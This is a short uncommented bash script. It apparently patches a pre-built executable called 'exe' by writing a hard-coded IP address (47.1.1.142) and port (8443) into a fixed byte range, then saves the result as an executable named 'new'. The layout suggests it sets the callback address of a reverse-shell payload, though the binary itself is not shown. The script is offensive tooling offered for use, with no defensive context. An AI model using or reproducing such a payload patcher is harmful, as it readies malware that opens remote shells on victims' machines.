#!/bin/bash                                                                                                              
ip="47.1.1.142"                                                                                                          
port=8443                                                                                                                
in_file=exe                                                                                                              
out_file="new"                                                                                                           
ip_to_hex() {                                                                                                            
    for o in `echo "$ip" | tr '.' ' '`; do                                                                               
        ip_hex=$(printf '%02x' $o)                                                                                       
        if [[ ! -z "$ip_hex1" ]]; then                                                                                   
            ip_hex=$(echo -n "$ip_hex1""$ip_hex")                                                                        
        fi                                                                                                               
        ip_hex1=$ip_hex                                                                                                  
    done                                                                                                                 
    ip_hex=$ip_hex1                                                                                                      
}                                                                                                                        
                                                                                                                         
port_to_hex() {                                                                                                          
    port_hex=$(printf '%02x' $port)                                                                                      
}                                                                                                                        
                                                                                                                         
ip_to_hex                                                                                                                
port_to_hex                                                                                                              
echo -n $(xxd -ps -l 138 $in_file) > $out_file.xxd                                                                       
echo -n "$port_hex""$ip_hex" >> $out_file.xxd                                                                            
echo -n $(xxd -ps -s 144 $in_file) >> $out_file.xxd                                                                      
sed -i 's/ /\n/g' $out_file.xxd                                                                                          
xxd -ps -r $out_file.xxd > $out_file                                                                                     
rm -f $out_file.xxd                                                                                                      
chmod +x $out_file            
